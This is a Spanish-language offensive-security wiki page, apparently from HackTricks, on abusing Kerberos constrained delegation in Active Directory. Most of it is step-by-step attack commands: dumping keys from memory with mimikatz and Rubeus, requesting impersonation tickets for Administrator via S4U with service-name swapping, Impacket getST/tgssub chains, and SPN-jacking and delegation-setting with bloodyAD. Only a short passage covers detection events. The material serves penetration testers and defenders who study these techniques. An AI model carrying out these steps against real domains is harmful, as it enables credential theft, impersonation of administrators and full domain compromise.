# Delegación restringida

{{#include ../../banners/hacktricks-training.md}}

## Delegación restringida

Con esto, un administrador de dominio puede **permitir** que un equipo **suplante la identidad de un usuario o equipo** ante cualquier **servicio** de una máquina.

- **Service for User to self (_S4U2self_):** Cualquier **cuenta de servicio que tenga un SPN** normalmente puede obtener un TGS para sí misma en nombre de un usuario arbitrario. Si la cuenta también tiene [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) en _userAccountControl_, ese TGS es **reenviable**, lo que hace que la transición de protocolo sea directamente útil para la **delegación restringida clásica**.
- **Service for User to Proxy(_S4U2proxy_):** Una **cuenta de servicio** puede obtener un TGS en nombre de un usuario para los SPN enumerados en **msDS-AllowedToDelegateTo**. El ticket de evidencia usado en S4U2Proxy debe ser un ticket **reenviable** dirigido al servicio que delega: ya sea un ticket real de cliente a servicio capturado de la víctima o uno generado con **S4U2Self + T2A4D**.

**Nota**: Si un usuario está marcado como ‘_La cuenta es confidencial y no se puede delegar_’ en AD, o es miembro de **Protected Users**, normalmente **no podrás suplantar su identidad** mediante delegación restringida. En dominios modernos, al atacar cuentas con delegación habilitada, es preferible usar material **AES** en lugar de asumir que solo se usa RC4.

Esto significa que, si **comprometes el hash del servicio**, puedes **suplantar la identidad de usuarios** y obtener **acceso** en su nombre a cualquier **servicio** en las máquinas indicadas (posible **privesc**).

Además, **no solo tendrás acceso al servicio que el usuario puede suplantar, sino también a cualquier servicio**, porque no se comprueba el SPN (el nombre del servicio solicitado) (esta parte del ticket no está cifrada ni firmada). Por lo tanto, si tienes acceso al **servicio CIFS**, también puedes acceder al **servicio HOST** usando, por ejemplo, el flag `/altservice` de Rubeus. La misma debilidad de sustitución de SPN es aprovechada por **Impacket getST -altservice** y otras herramientas.

Además, se necesita acceso al **servicio LDAP en un DC** para explotar **DCSync**.

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**Nota para el operador:** no confíes únicamente en capturas de pantalla de **ADUC** o BloodHound para revisar **gMSA/sMSA**. Esas cuentas suelen ocultar la pestaña habitual de Delegation, así que enumera directamente los atributos **`userAccountControl`** y **`msDS-AllowedToDelegateTo`** sin procesar.

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Delegación restringida con transición de protocolo vs solo Kerberos

Si la cuenta comprometida tiene **T2A4D**, normalmente puedes completar toda la cadena **`S4U2Self -> S4U2Proxy`** usando solo la clave/TGT del servicio.<sup>[[2]](#references)</sup>

Si solo tiene **`msDS-AllowedToDelegateTo** (el modo clásico **"Use Kerberos only"**), la delegación puede seguir siendo aprovechable, pero el ticket de evidencia para S4U2Proxy debe ser un **ticket forwardable de usuario a servicio** para el servicio que delega. Una opción es capturar un TGS de una víctima desde **LSASS/ccache** y pasarlo a la segunda etapa (`/tgs:` en Rubeus). Un ticket S4U2Self **non-forwardable** **no** basta para la delegación restringida clásica; si ese es tu único ticket de evidencia, consulta [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

Otra opción condicional es un primer salto de [RBCD](resource-based-constrained-delegation.md) al servicio que delega: si genera un ticket **forwardable** para el usuario y el servicio previstos, ese ticket puede probarse como evidencia para un salto S4U2Proxy posterior de solo Kerberos. Confirma los flags del primer ticket, el SPN del servicio que delega, su lista de destinos permitidos y cualquier restricción de delegación del usuario; controlar solo un atributo RBCD no demuestra que el segundo salto sea posible.

### Notas sobre delegación restringida entre dominios (2025+)

Desde **Windows Server 2012/2012 R2**, el KDC admite **delegación restringida entre dominios/bosques** mediante extensiones de S4U2Proxy. Las versiones modernas (Windows Server 2016–2025) mantienen este comportamiento y añaden dos SID de PAC para indicar la transición de protocolo:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) cuando el usuario se autenticó normalmente.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) cuando un servicio afirmó la identidad mediante la transición de protocolo.

Si se usa la transición de protocolo entre dominios, espera encontrar `SERVICE_ASSERTED_IDENTITY` en el PAC, lo que confirma que el paso S4U2Proxy se completó correctamente.<sup>[[1]](#references)</sup>

### Herramientas de Impacket / Linux (altservice y S4U completo)

Las versiones recientes de Impacket (0.11.x+) ofrecen la misma cadena S4U y el intercambio de SPN que Rubeus:<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

Si prefieres forjar primero el ST del usuario (p. ej., si solo tienes el hash offline), combina **ticketer.py** con **getST.py** para S4U2Proxy. `tgssub.py` también resulta útil cuando ya tienes un ccache funcional y solo necesitas cambiar la clase de servicio para el mismo host. Consulta el issue #1713 abierto de Impacket para conocer los problemas actuales (KRB_AP_ERR_MODIFIED cuando el ST forjado no coincide con la clave del SPN).<sup>[[2]](#references)</sup>

### SPN-jacking: redirigir un destino de delegación restringida

La delegación restringida clásica autoriza una **cadena SPN** en `msDS-AllowedToDelegateTo`, no un SID de destino inmutable. Durante S4U2Proxy, el KDC resuelve qué cuenta posee actualmente ese SPN y cifra el ticket de servicio con la clave de largo plazo de esa cuenta. Por lo tanto, controlar la cuenta delegante y tener `WriteSPN` sobre otra cuenta de servicio o de equipo permite redirigir una restricción de delegación sin cambios, sin `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Existen dos variantes:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** el SPN permitido está huérfano porque su propietario anterior fue eliminado, renombrado o se le quitó el SPN. Añádelo directamente a la cuenta de destino deseada.
- **Live SPN-jacking:** el SPN todavía pertenece a una cuenta de origen. La validación de SPN duplicados normalmente bloquea la escritura en el destino, por lo que se necesita `WriteSPN` en ambos objetos: quítalo del origen, añádelo al destino, obtén el ticket y restaura el registro original.

El siguiente flujo abstracto en Linux mueve un SPN permitido, ejecuta S4U como la entidad delegante comprometida y reescribe el nombre de servicio del ticket para que corresponda a un servicio útil en el nuevo destino.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice` es la segunda primitiva, independiente. El ticket S4U2Proxy se cifró para la cuenta que ahora posee `$DELEGATED_SPN`; como el nombre del servicio del ticket (`sname`) está fuera del cuerpo cifrado del ticket, las herramientas pueden sustituirlo por otra clase de servicio/hostname cuyo servicio use la misma clave de cuenta. SPN-jacking primero cambia **qué clave de cuenta** protege el ticket, mientras que la sustitución de la clase de servicio cambia **dónde se presenta** ese ticket.<sup>[[5]](#references)[[6]](#references)</sup>

Para el jacking en vivo, invierte las dos escrituras LDAP inmediatamente después de obtener el ticket para evitar interrumpir el servicio legítimo. En los DC con auditoría de cuentas de equipo habilitada, busca el evento de seguridad **4742** en el que se elimine `servicePrincipalName` de un equipo y se añada poco después a otro, especialmente cuando el hostname del SPN difiera del `dNSHostName` del destino. Correlaciona con el evento **4769**: S4U2Self presenta la misma cuenta como cliente/servicio, mientras que S4U2Proxy rellena **Transited Services**.<sup>[[5]](#references)</sup>

### Configurar la delegación en una cuenta bajo tu control

Esta vía requiere **acceso de escritura efectivo** a los atributos de delegación de la cuenta de equipo o servicio (por ejemplo, `GenericAll` o `WriteDACL` seguido de un cambio de ACL) **y** el derecho de usuario `SeEnableDelegationPrivilege` para la cuenta que realiza el cambio LDAP. Microsoft exige ese privilegio cuando se modifica `msDS-AllowedToDelegateTo`; los derechos de control sobre el objeto por sí solos no lo eluden. Comprueba ambos requisitos previos antes de usar un cliente LDAP como **bloodyAD** para configurar la delegación con transición de protocolo.<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

Una cuenta de equipo existente puede ser candidata incluso cuando `ms-DS-MachineAccountQuota` es cero; esa cuota limita la ruta predeterminada para crear equipos nuevos, no los permisos sobre un objeto existente. Para usar la delegación configurada, también necesitas controlar la clave o la contraseña de la cuenta delegante, un nombre de entidad de servicio válido y un usuario de destino cuyas credenciales se puedan delegar. Estas condiciones y el acceso efectivo al directorio deben comprobarse por separado.

- Step 1: **Obtener el TGT del servicio permitido**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> Hay **otras formas de obtener un ticket TGT** o el **RC4** o **AES256** sin ser SYSTEM en el equipo, como Printer Bug y unconstrained delegation, NTLM relaying y el abuso de Active Directory Certificate Service
>
> **Con solo tener ese ticket TGT (o su hash), puedes realizar este ataque sin comprometer todo el equipo.**

- Step2: **Obtener un TGS para el servicio suplantando al usuario**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**Más información en ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Descripción general de la delegación restringida de Kerberos (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Abuso de la delegación con Impacket (Parte 2): delegación restringida (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Delegación restringida de Kerberos (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity acabó con el dominio: una descripción general ofensiva de Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: un caso límite de abuso de WriteSPN](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
